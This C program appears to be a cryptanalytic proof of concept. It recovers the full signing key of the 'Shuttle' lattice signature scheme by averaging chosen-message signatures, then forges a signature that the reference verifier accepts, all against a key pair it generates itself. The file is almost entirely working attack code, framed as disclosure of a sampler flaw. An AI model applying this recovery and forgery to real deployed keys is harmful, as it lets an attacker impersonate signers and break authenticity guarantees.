/* ====================================================================
 *  Shuttle signing-key recovery + universal forgery
 *  --------------------------------------------------------------------
 *  Recovers the full Shuttle signing key from (public key, a batch of
 *  signatures on attacker-chosen messages), then forges a signature on a
 *  fresh message that the *unmodified* reference verifier accepts.
 *
 *  Threat model  : EUF-CMA.  The adversary sees the public key and may
 *                  query the honest signer (which holds sk) on messages of
 *                  its choice.  It never reads sk.
 *
 *  Root cause    : the rejection-free iterative sampler R_transition sign-
 *                  normalises the secret shift v_i = X^{j_i} s so that
 *                  <z,v_i> > 0 at every step.  The chosen increment then
 *                  carries a first-order component along s, so
 *                      E[ z | c ] = kappa * sum_{i} X^{j_i} s ,  kappa = O(1).
 *                  Averaging signatures against the challenge support
 *                  isolates kappa * s.
 *
 *  What is public / what is secret in this program:
 *    * pk, all queried signatures, and sample_c() are PUBLIC.
 *    * seedA and (rounded) b are read from pk via unpack_pk  -> PUBLIC.
 *    * the estimator, kappa search, and e' completion use ONLY the above.
 *    * the true (s, e') is unpacked from sk ONLY inside the block marked
 *      "SCORING ONLY" to report the exact-coefficient count; it never
 *      feeds the recovery.
 *
 *  Build: see Makefile (links against the Shuttle reference implementation).
 *  Usage: ./key_recovery [num_signatures] [key_seed]
 * ==================================================================== */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <math.h>
#include <time.h>
#include "api.h"
#include "params.h"
#include "poly.h"
#include "polyvec.h"
#include "packing.h"
#include "rounding.h"
#include "reduce.h"
#include "symmetric.h"
#include "drng.h"

/* reference-implementation entry points */
int  crypto_sign_keypair_xi(uint8_t *pk, uint8_t *sk, const uint8_t xi[SEEDBYTES]);
int  crypto_sign_signature_rnd(uint8_t *sig, size_t *sl, const uint8_t *m, size_t ml,
                               const uint8_t *sk, const uint8_t rnd[RNDBYTES]);
int  crypto_sign_verify(const uint8_t *sig, size_t sl, const uint8_t *m, size_t ml,
                        const uint8_t *pk);
void expand_a(poly16 agen[EM], poly16 hAgen[EM * ELL], const uint8_t seedA[SEEDBYTES]);
void keygen_bproduct(poly b0[EM], const poly16 agen[EM], const poly16 hAgen[EM * ELL],
                     const poly s[ELL], const poly e[EM]);

DRNG_ctx drng_algorithm;                 /* required global for the reference DRBG */

/* deterministic attacker-side PRNG (independent of the scheme) */
static uint64_t st = 0xA11CE;
static void fill(uint8_t *b, size_t n)
{
    for (size_t i = 0; i < n; i++) {
        st = st * 6364136223846793005ULL + 1442695040888963407ULL;
        b[i] = (uint8_t)(st >> 56);
    }
}

static int centered(int32_t x) { int32_t d = freeze(x); if (d > Q / 2) d -= Q; return d; }

int main(int argc, char **argv)
{
    long T   = (argc > 1) ? atol(argv[1]) : (long)(600L * TAU); /* signature queries */
    uint64_t ks = (argc > 2) ? strtoull(argv[2], 0, 10) : 1;

    /* ---------------- challenger: generate a key pair ---------------- */
    uint8_t pk[CRYPTO_PUBLICKEYBYTES], sk[CRYPTO_SECRETKEYBYTES], xi[SEEDBYTES];
    fill(xi, SEEDBYTES); st ^= ks * 0x9E3779B97F4A7C15ULL;
    if (crypto_sign_keypair_xi(pk, sk, xi)) { printf("keygen failed\n"); return 1; }

    /* ---------------- adversary: read PUBLIC key material ------------ */
    uint8_t seedA[SEEDBYTES]; poly b_pub[EM];
    if (unpack_pk(seedA, b_pub, pk)) { printf("unpack_pk failed\n"); return 1; }

    /* ---------------- adversary: collect signatures ----------------- *
     * Estimator (Sec. 3):  acc[i][k] = sum over signatures and over the
     * challenge support j of  z1[0][j] * (X^{-j} z1[1+i])[k]  ~  kappa*s[i][k]. */
    static double acc[ELL][N]; long cnt = 0;
    uint8_t sig[CRYPTO_BYTES + 16]; size_t sl; uint8_t m[32], rnd[RNDBYTES];
    struct timespec t0, t1; clock_gettime(CLOCK_MONOTONIC, &t0);
    for (long t = 0; t < T; t++) {
        fill(m, 32); fill(rnd, RNDBYTES);
        if (crypto_sign_signature_rnd(sig, &sl, m, 32, sk, rnd)) continue;   /* signer holds sk */
        uint8_t seedC[CHALLENGESEEDBYTES]; poly z1[Z1LEN], h[EM], c;
        if (unpack_sig(seedC, z1, h, sig)) continue;
        sample_c(&c, seedC);                                                 /* PUBLIC */
        for (int j = 0; j < N; j++) if (c.coeffs[j]) {
            double a = z1[0].coeffs[j]; cnt++;
            for (int i = 0; i < ELL; i++)
                for (int k = 0; k < N; k++) {
                    int idx = k + j;
                    double v = idx < N ? z1[1 + i].coeffs[idx] : -z1[1 + i].coeffs[idx - N];
                    acc[i][k] += a * v;
                }
        }
    }
    clock_gettime(CLOCK_MONOTONIC, &t1);
    double secs = (t1.tv_sec - t0.tv_sec) + (t1.tv_nsec - t0.tv_nsec) / 1e9;

    /* ---------------- secret-free scale (kappa) selection ----------- *
     * kappa is not known a priori.  Pick the kappa that best satisfies the
     * PUBLIC relation b = a_gen + A_gen * s1 (mod q): rounding acc/(cnt*kappa)
     * to integers should minimise ||b_pub - (a_gen + A_gen*s1hat)||_inf.    */
    poly16 agen[EM], hAgen[EM * ELL]; expand_a(agen, hAgen, seedA);
    poly zero[EM]; for (int i = 0; i < EM; i++) memset(&zero[i], 0, sizeof(poly));
    poly s1hat[ELL], prod[EM]; double kap = 0; int best = 1 << 30;
    for (double kc = 1.0; kc <= 4.0; kc += 0.01) {
        for (int i = 0; i < ELL; i++)
            for (int k = 0; k < N; k++)
                s1hat[i].coeffs[k] = (int32_t)lround(acc[i][k] / cnt / kc);
        keygen_bproduct(prod, agen, hAgen, s1hat, zero);
        int mx = 0;
        for (int i = 0; i < EM; i++)
            for (int k = 0; k < N; k++) {
                int d = centered(b_pub[i].coeffs[k] - prod[i].coeffs[k]);
                if (d < 0) d = -d; if (d > mx) mx = d;
            }
        if (mx < best) { best = mx; kap = kc; }
    }
    for (int i = 0; i < ELL; i++)
        for (int k = 0; k < N; k++)
            s1hat[i].coeffs[k] = (int32_t)lround(acc[i][k] / cnt / kap);

    /* complete e' from the PUBLIC relation e' = b_pub - (a_gen + A_gen*s1hat) */
    keygen_bproduct(prod, agen, hAgen, s1hat, zero);
    poly ephat[EM];
    for (int i = 0; i < EM; i++)
        for (int k = 0; k < N; k++)
            ephat[i].coeffs[k] = (int32_t)centered(b_pub[i].coeffs[k] - prod[i].coeffs[k]);

    printf("=== Shuttle-%d key recovery ===\n", LAMBDA);
    printf("signature queries : %ld   (estimator samples = %ld)\n", T, cnt);
    printf("recovery time     : %.1f s   (kappa_fit = %.2f)\n", secs, kap);

    /* ---------------- universal forgery from the recovered key ------- *
     * Rebuild a signing key from PUBLIC seedA/b_pub, tr = HashPK(pk), an
     * arbitrary master seed, and the recovered (s1hat, ephat); then sign a
     * FRESH message and check it against the unmodified reference verifier. */
    uint8_t tr[CHALLENGESEEDBYTES];
    { uint8_t in[1 + CRYPTO_PUBLICKEYBYTES]; xof_ctx h;
      in[0] = 0x05; memcpy(in + 1, pk, CRYPTO_PUBLICKEYBYTES);
      xof256_init(&h, in, 1 + CRYPTO_PUBLICKEYBYTES);
      xof256_squeeze(&h, tr, CHALLENGESEEDBYTES); }
    uint8_t masterK[CHALLENGESEEDBYTES]; memset(masterK, 0, sizeof masterK);
    uint8_t sk_forged[CRYPTO_SECRETKEYBYTES];
    pack_sk(sk_forged, seedA, b_pub, masterK, tr, s1hat, ephat);
    uint8_t fmsg[40]; for (int i = 0; i < 40; i++) fmsg[i] = (uint8_t)(0xF0 ^ i);
    uint8_t fsig[CRYPTO_BYTES + 16]; size_t fsl; uint8_t frnd[RNDBYTES];
    fill(frnd, RNDBYTES);
    int forged = crypto_sign_signature_rnd(fsig, &fsl, fmsg, sizeof fmsg, sk_forged, frnd);
    int accept = forged ? -1 : crypto_sign_verify(fsig, fsl, fmsg, sizeof fmsg, pk);
    printf("forgery on fresh message : %s\n",
           (!forged && accept == 0) ? "ACCEPTED by reference verifier (universal forgery)"
                                    : "not produced");

    /* ================= SCORING ONLY (reads the true sk) ============= *
     * Everything above used only public data.  We now open sk purely to
     * report how many coefficients were recovered exactly.               */
    {
        uint8_t s_seedA[SEEDBYTES], s_K[CHALLENGESEEDBYTES], s_tr[CHALLENGESEEDBYTES];
        poly s_b[EM], s_s[ELL], s_ep[EM];
        unpack_sk(s_seedA, s_b, s_K, s_tr, s_s, s_ep, sk);
        int s1wrong = 0;
        for (int i = 0; i < ELL; i++)
            for (int k = 0; k < N; k++)
                if (s1hat[i].coeffs[k] != s_s[i].coeffs[k]) s1wrong++;
        int epwrong = 0, epmax = 0;
        for (int i = 0; i < EM; i++)
            for (int k = 0; k < N; k++) {
                int d = ephat[i].coeffs[k] - s_ep[i].coeffs[k]; int ad = d < 0 ? -d : d;
                if (ad > epmax) epmax = ad; if (d) epwrong++;
            }
        printf("[scoring] s1 exact : %d/%d   e' exact : %d/%d (max dev %d)\n",
               ELL * N - s1wrong, ELL * N, EM * N - epwrong, EM * N, epmax);
        printf("[scoring] %s\n",
               (s1wrong == 0) ? "s1 FULLY RECOVERED (exact signing key)"
                              : "s1 partially recovered");
    }
    return 0;
}
